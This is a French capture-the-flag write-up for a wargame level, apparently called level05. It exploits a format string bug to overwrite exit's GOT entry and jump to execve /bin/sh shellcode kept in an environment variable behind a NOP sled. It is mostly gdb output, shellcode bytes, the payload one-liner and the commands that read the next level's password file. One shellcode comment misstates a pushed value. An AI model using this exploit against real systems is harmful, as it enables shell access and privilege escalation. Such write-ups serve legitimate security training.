# gdb:
	> disas exit
<<< Dump of assembler code for function exit@plt:
<<< 0x08048370 <+0>:	jmp    *0x80497e0
<<< 0x08048376 <+6>:	push   $0x18
<<< 0x0804837b <+11>:	jmp    0x8048330
<<< End of assembler dump.

On va modifier exit pour qu'il jump au shellcode ci-dessous:

# char sc[] = "\x6a\x0b" // push byte +0xb
# "\x58" // pop eax
# "\x99" // cdq
# "\x52" // push edx
# "\x68\x2f\x2f\x73\x68" // push dword 0x68732f2f
# "\x68\x2f\x62\x69\x6e" // push dword 0x6e69922f
# "\x89\xe3" // mov ebx, esp
# "\x31\xc9" // xor ecx, ecx
# "\xcd\x80"; // int 0x80

# bash:
	export PAYLOAD05=$(python -c "print '\x90'*500 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'")

	<!-- > export PAYLOAD05=$(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'") -->

# gdb:
	> b main
	> r
	> x/200s environ
<<< 0xffffdd40: "PAYLOAD05=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\..."
	> x/200c 0xffffdd40
<<< 0xffffdd40:	80 'P' 65  'A' 89  'Y' 76  'L' 79  'O' 65  'A' 68  'D' 48  '0'
0xffffdd48: 53  '5' 61  '=' -112  '\220' -112  '\220' -112  '\220' -112  '\220' -112  '\220' -112  '\220'
0xffffdd50: -112  '\220' -112  '\220' -112  '\220' -112  '\220' -112  '\220'	-112 '\220'	-112 '\220'	-112 '\220'

Prenons une adresse de notre payload dans le nop sled, par exemple 0xffffdd58

0xffffdd58
0xffffdd58 - 8 = ffff dd50
dd50 = 56656
ffff - dd58 = 8879	

# bash:
	<!-- b *0x0804850c -->
	<!-- r < <(cat /tmp/payload05) -->
	<!-- x/24bx 0x080497e0 -->

	> python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%56656c" + "%10$hn" + "%8871c" + "%11$hn"' > /tmp/payload05
	> cat /tmp/payload05 - | ./level05
	> cat /home/users/level06/.pass
<<< h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq